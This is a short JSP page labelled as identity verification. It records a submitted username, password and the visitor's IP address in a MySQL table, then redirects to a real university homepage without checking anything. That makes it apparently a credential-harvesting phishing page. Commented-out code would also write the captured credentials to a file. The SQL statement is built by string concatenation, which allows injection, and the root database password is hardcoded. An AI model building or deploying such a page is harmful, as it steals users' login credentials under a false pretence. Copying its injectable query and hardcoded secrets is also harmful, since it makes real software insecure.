<%@ page language="java" contentType="text/html; charset=GB18030"
pageEncoding="GB18030"%>
<%@ page import="java.util.*" %>
<%@ page import="java.io.*" %> 
<%@ page import ="java.sql.*" %>
<%@ page import="com.mysql.jdbc.Driver" %>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>身份验证</title>
</head>
<body>
<%
  Statement st;
  Connection conn = null;
  //加载数据库驱动类
   Class.forName("com.mysql.jdbc.Driver").newInstance();
   //数据库连接URL
   String url="jdbc:mysql://127.0.0.1:3306/jspmysql";
   //String url="jdbc:mysql://localhost:3306/sample_db?user=root&password=your_password";
   //数据库用户名和密码
   String user="root";
   String  password="1234";
   //根据数据库参数取得一个数据库连接值
   conn =  DriverManager.getConnection(url,user,password);
%>
<%
request.setCharacterEncoding("GBK");
String name = request.getParameter("userName");
String password1 = request.getParameter("password");
String ip=(String)request.getRemoteAddr();
/* String path=request.getRealPath("/");
  File fp=new File(path,"记录.txt");
  FileWriter fwriter=new FileWriter(fp);
  fwriter.write("用户名：");
  fwriter.write(name+"\r\n");
  fwriter.write("密码：");
  fwriter.write(password+"\r\n");
  fwriter.write(ip);
  fwriter.close();*/
  String sql="INSERT INTO jsp(user,password,ip) VALUES('"+name+"','"+password1+"','"+ip+"')";
  st = (Statement) conn.createStatement();    // 创建用于执行静态sql语句的Statement对象   
  int count = st.executeUpdate(sql);  // 执行插入操作的sql语句，并返回插入数据的个数   
  if(count>0)
    {
    response.sendRedirect("http://www.hitwh.edu.cn");
    }   
  else
  {
	response.sendRedirect("index.html"); 
  }
	conn.close();   //关闭数据库连接   
%>

<%

%>
</body>
</html> 
